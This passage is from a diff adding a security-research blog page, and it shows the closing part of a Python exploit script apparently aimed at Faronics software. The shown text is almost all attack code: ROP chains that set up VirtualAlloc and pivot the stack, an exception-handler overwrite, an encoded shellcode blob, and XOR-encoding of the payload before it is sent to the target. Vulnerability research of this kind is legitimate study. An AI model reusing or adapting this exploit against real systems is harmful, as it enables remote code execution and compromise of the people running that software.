+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) <span style="color:#75715e">## dummy ebp</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004d76f4</span>) <span style="color:#75715e">## pop eax ; ret</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00A508AC</span>) <span style="color:#75715e">## VirtualAlloc IAT </span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006700c4</span>) <span style="color:#75715e">## mov eax, dword ptr [eax] ; ret</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00588a1a</span>) <span style="color:#75715e">## mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Write Return Address</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x005039bd</span>) <span style="color:#75715e">## mov eax, edx ; ret</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004a55fb</span>) <span style="color:#75715e">## pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xfffffffc</span>) <span style="color:#75715e">## -4</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006654c2</span>) <span style="color:#75715e">## sub eax, ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00542afb</span>) <span style="color:#75715e">## ret 0x20</span>
+</span></span><span style="display:flex;"><span>rop1 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004023c1</span>) <span style="color:#75715e">## ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Z&#34;</span><span style="color:#f92672">*</span>(cyclic_find(<span style="color:#e6db74">&#34;haaa&#34;</span>)) 
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006b500f</span>) <span style="color:#75715e">## mov edx, eax ; pop ebp ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) <span style="color:#75715e">## dummy ebp</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004a55fb</span>) <span style="color:#75715e">## pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xfffffe4c</span>) <span style="color:#75715e">## -0x1b4</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006654c2</span>) <span style="color:#75715e">## sub eax, ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00588a1a</span>) <span style="color:#75715e">## mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Write lpAddress</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x005039bd</span>) <span style="color:#75715e">## mov eax, edx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004a55fb</span>) <span style="color:#75715e">## pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xfffffffc</span>) <span style="color:#75715e">## -4</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006654c2</span>) <span style="color:#75715e">## sub eax, ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006b500f</span>) <span style="color:#75715e">## mov edx, eax ; pop ebp ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) <span style="color:#75715e">## dummy ebp</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00588a1a</span>) <span style="color:#75715e">## mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Write dwSize</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004a55fb</span>) <span style="color:#75715e">## pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xfffffffc</span>) <span style="color:#75715e">## -4</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006654c2</span>) <span style="color:#75715e">## sub eax, ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006b500f</span>) <span style="color:#75715e">## mov edx, eax ; pop ebp ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) <span style="color:#75715e">## dummy ebp</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004d76f4</span>) <span style="color:#75715e">## pop eax ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) 
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004a55fb</span>) <span style="color:#75715e">## pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xfffff6ff</span>) <span style="color:#75715e">## 0xffffffff-0xfffff6ff = 0x900</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006654c2</span>) <span style="color:#75715e">## sub eax, ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00588a1a</span>) <span style="color:#75715e">## mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Write flAllocationType</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x005039bd</span>) <span style="color:#75715e">## mov eax, edx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004a55fb</span>) <span style="color:#75715e">## pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xfffffffc</span>) <span style="color:#75715e">## -4</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006654c2</span>) <span style="color:#75715e">## sub eax, ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006b500f</span>) <span style="color:#75715e">## mov edx, eax ; pop ebp ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) <span style="color:#75715e">## dummy ebp</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004d76f4</span>) <span style="color:#75715e">## pop eax ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) 
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004a55fb</span>) <span style="color:#75715e">## pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffefff</span>) <span style="color:#75715e">## 0xffffffff-0xffffefff = 0x1000</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006654c2</span>) <span style="color:#75715e">## sub eax, ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00588a1a</span>) <span style="color:#75715e">## mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Write flProtect</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x005039bd</span>) <span style="color:#75715e">## mov eax, edx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004a55fb</span>) <span style="color:#75715e">## pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xfffffffc</span>) <span style="color:#75715e">## -4</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006654c2</span>) <span style="color:#75715e">## sub eax, ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006b500f</span>) <span style="color:#75715e">## mov edx, eax ; pop ebp ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) <span style="color:#75715e">## dummy ebp</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004d76f4</span>) <span style="color:#75715e">## pop eax ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffff</span>) 
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004a55fb</span>) <span style="color:#75715e">## pop ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffbf</span>) <span style="color:#75715e">## 0xffffffff-0xffffffbf = 0x40</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006654c2</span>) <span style="color:#75715e">## sub eax, ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00588a1a</span>) <span style="color:#75715e">## mov dword ptr [edx], eax ; ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Stack pivot</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x005039bd</span>) <span style="color:#75715e">## mov eax, edx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00402a35</span>) <span style="color:#75715e">## pop ebp ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0xffffffec</span>) <span style="color:#75715e">## -20</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x004e041b</span>) <span style="color:#75715e">## add eax, ecx ; ret</span>
+</span></span><span style="display:flex;"><span>rop2 <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x00441ec6</span>) <span style="color:#75715e">## xchg esp, eax ; ret</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> rop1
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Z&#34;</span><span style="color:#f92672">*</span>(cyclic_find(<span style="color:#e6db74">&#34;faab&#34;</span>)<span style="color:#f92672">-</span>len(rop1))
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> p32(<span style="color:#ae81ff">0x006224cf</span>) <span style="color:#75715e">## handler -- popal ; salc ; cld ; call dword ptr [eax - 0x18]</span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> rop2
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> cyclic(cyclic_find(<span style="color:#e6db74">&#34;baab&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Shellcode</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">=</span>  <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x90</span><span style="color:#e6db74">&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x100</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xd9\xf7\xbd\x4c\x81\x23\x79\xd9\x74\x24\xf4</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5a\x2b\xc9\xb1\x52\x83\xc2\x04\x31\x6a\x13</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x03\x26\x92\xc1\x8c\x4a\x7c\x87\x6f\xb2\x7d</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe8\xe6\x57\x4c\x28\x9c\x1c\xff\x98\xd6\x70</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0c\x52\xba\x60\x87\x16\x13\x87\x20\x9c\x45</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa6\xb1\x8d\xb6\xa9\x31\xcc\xea\x09\x0b\x1f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xff\x48\x4c\x42\xf2\x18\x05\x08\xa1\x8c\x22</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x44\x7a\x27\x78\x48\xfa\xd4\xc9\x6b\x2b\x4b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x41\x32\xeb\x6a\x86\x4e\xa2\x74\xcb\x6b\x7c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x0f\x3f\x07\x7f\xd9\x71\xe8\x2c\x24\xbe\x1b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x2c\x61\x79\xc4\x5b\x9b\x79\x79\x5c\x58\x03</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xa5\xe9\x7a\xa3\x2e\x49\xa6\x55\xe2\x0c\x2d</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x59\x4f\x5a\x69\x7e\x4e\x8f\x02\x7a\xdb\x2e</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc4\x0a\x9f\x14\xc0\x57\x7b\x34\x51\x32\x2a</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x49\x81\x9d\x93\xef\xca\x30\xc7\x9d\x91\x5c</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x24\xac\x29\x9d\x22\xa7\x5a\xaf\xed\x13\xf4</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x83\x66\xba\x03\xe3\x5c\x7a\x9b\x1a\x5f\x7b</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb2\xd8\x0b\x2b\xac\xc9\x33\xa0\x2c\xf5\xe1</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x67\x7c\x59\x5a\xc8\x2c\x19\x0a\xa0\x26\x96</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x75\xd0\x49\x7c\x1e\x7b\xb0\x17\xe1\xd4\x97</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x17\x89\x26\xe7\xd6\xf1\xae\x01\xb2\x15\xe7</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9a\x2b\x8f\xa2\x50\xcd\x50\x79\x1d\xcd\xdb</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8e\xe2\x80\x2b\xfa\xf0\x75\xdc\xb1\xaa\xd0</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xe3\x6f\xc2\xbf\x76\xf4\x12\xc9\x6a\xa3\x45</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x9e\x5d\xba\x03\x32\xc7\x14\x31\xcf\x91\x5f</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xf1\x14\x62\x61\xf8\xd9\xde\x45\xea\x27\xde</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xc1\x5e\xf8\x89\x9f\x08\xbe\x63\x6e\xe2\x68</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xdf\x38\x62\xec\x13\xfb\xf4\xf1\x79\x8d\x18</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x43\xd4\xc8\x27\x6c\xb0\xdc\x50\x90\x20\x22</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x8b\x10\x40\xc1\x19\x6d\xe9\x5c\xc8\xcc\x74</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x5f\x27\x12\x81\xdc\xcd\xeb\x76\xfc\xa4\xee</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>shellcode <span style="color:#f92672">+=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x33\xba\x55\x83\x2c\x2f\x59\x30\x4c\x7a</span><span style="color:#e6db74">&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> shellcode
+</span></span><span style="display:flex;"><span>data <span style="color:#f92672">+=</span> cyclic(size<span style="color:#f92672">-</span>len(data))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>header <span style="color:#f92672">+=</span> p32(encode_three(data, size<span style="color:#f92672">-</span><span style="color:#ae81ff">0x10</span><span style="color:#f92672">-</span><span style="color:#ae81ff">0x4</span>))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> header <span style="color:#f92672">+</span> data
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;Total len of payload: &#34;</span> <span style="color:#f92672">+</span> hex(len(payload)))
+</span></span><span style="display:flex;"><span>payload <span style="color:#f92672">=</span> bytearray(payload)
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(payload)): 
+</span></span><span style="display:flex;"><span>    payload[i] <span style="color:#f92672">=</span> payload[i] <span style="color:#f92672">^</span> key1[i]
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> i <span style="color:#f92672">in</span> range(len(payload)<span style="color:#f92672">-</span><span style="color:#ae81ff">4</span>):
+</span></span><span style="display:flex;"><span>    payload[i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">=</span> payload[i<span style="color:#f92672">+</span><span style="color:#ae81ff">4</span>] <span style="color:#f92672">^</span> key2[i]
+</span></span><span style="display:flex;"><span>proc<span style="color:#f92672">.</span>send(payload)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Log payload information (debug)</span>
+</span></span><span style="display:flex;"><span>product <span style="color:#f92672">=</span> decode(payload)
+</span></span><span style="display:flex;"><span>decode_print(product)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Pause to prevent closing socket or thing will explode</span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">## Faronics will reject the packet if the socket is closed</span>
+</span></span><span style="display:flex;"><span>pause()
+</span></span></code></pre></div><p>Thanks for reading!</p>
+
+    <h4><a href="https://kaligulaarmblessed.github.io">Back to Home</a></h4>
+</div>
+
+
+        </div><footer class="container">
+    <hr class="soften">
+    <p>
+&copy; 
+
+    Kaligula Armblessed
+
+<span id="thisyear">2023</span>
+
+
+        | Built on <a href="//gohugo.io" target="_blank">Hugo</a>
+
+</p>
+    <p class="text-center">
+        
+        <a href="https://twitter.com/KaligulaSec">Twitter</a> 
+        
+        <a href="https://github.com/KaligulaArmblessed">GitHub</a> 
+        
+    </p>
+</footer>
+
+</body><link rel="stylesheet" href="/css/bootstrap.css">
+<link rel="stylesheet" href="/css/bootstrap-responsive.css">
+<link rel="stylesheet" href="/css/style.css">
+
+<script src="/js/jquery.js"></script>
+<script src="/js/bootstrap-386.js"></script>
+<script src="/js/bootstrap-transition.js"></script>
+<script src="/js/bootstrap-alert.js"></script>
+<script src="/js/bootstrap-modal.js"></script>
+<script src="/js/bootstrap-dropdown.js"></script>
+<script src="/js/bootstrap-scrollspy.js"></script>
+<script src="/js/bootstrap-tab.js"></script>
+<script src="/js/bootstrap-tooltip.js"></script>
+<script src="/js/bootstrap-popover.js"></script>
+<script src="/js/bootstrap-button.js"></script>
+<script src="/js/bootstrap-collapse.js"></script>
+<script src="/js/bootstrap-carousel.js"></script>
+<script src="/js/bootstrap-typeahead.js"></script>
+<script src="/js/bootstrap-affix.js"></script>
+<script>
+    _386 = { 
+        fastLoad: false ,
+        onePass: true , 
+        speedFactor: 1 
+    };
+
+    
+    function ThisYear() {
+        document.getElementById('thisyear').innerHTML = new Date().getFullYear();
+    };
+</script></html>
